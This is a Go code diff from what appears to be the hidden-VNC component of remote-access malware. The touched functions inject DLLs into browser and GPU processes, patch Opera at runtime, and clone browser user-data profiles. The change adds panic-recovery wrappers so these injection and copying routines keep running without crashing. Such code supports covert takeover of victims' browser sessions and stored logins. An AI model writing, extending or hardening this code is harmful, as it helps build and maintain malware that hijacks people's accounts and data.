@@ -163,7 +163,10 @@ func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, c
 			return err
 		}
 		if info.needsPatch && pid != 0 {
-			go patchOperaAsync(pid, 5, 2*time.Second)
+			go func() {
+				defer recoverAndLog("hvnc patch opera", nil)
+				patchOperaAsync(pid, 5, 2*time.Second)
+			}()
 		}
 		return nil
 	}
@@ -207,7 +210,10 @@ func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, c
 		return err
 	}
 	if info.needsPatch && pid != 0 {
-		go patchOperaAsync(pid, 5, 2*time.Second)
+		go func() {
+			defer recoverAndLog("hvnc patch opera", nil)
+			patchOperaAsync(pid, 5, 2*time.Second)
+		}()
 	}
 	return nil
 }
@@ -622,6 +628,11 @@ func cloneBrowserProfile(browserName string, srcUserData string, lite bool, onPr
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
+			defer func() {
+				if r := recover(); r != nil {
+					log.Printf("[panic] hvnc file copy worker: %v", r)
+				}
+			}()
 			for job := range jobCh {
 				n, err := forceCopyFile(job.src, job.dst)
 				if err != nil {
@@ -811,7 +822,10 @@ func startHVNCProcessInjectedOnThread(filePath string, dllBytes []byte, captureD
 		if !hvncDXGIEnabled.Load() {
 			log.Printf("hvnc inject: DXGI is disabled, skipping capture DLL injection for GPU child process")
 		} else {
-			go hvncDeferredGPUInject(pid, captureDllBytes)
+			go func() {
+				defer recoverAndLog("hvnc deferred gpu inject", nil)
+				hvncDeferredGPUInject(pid, captureDllBytes)
+			}()
 		}
 	}
 
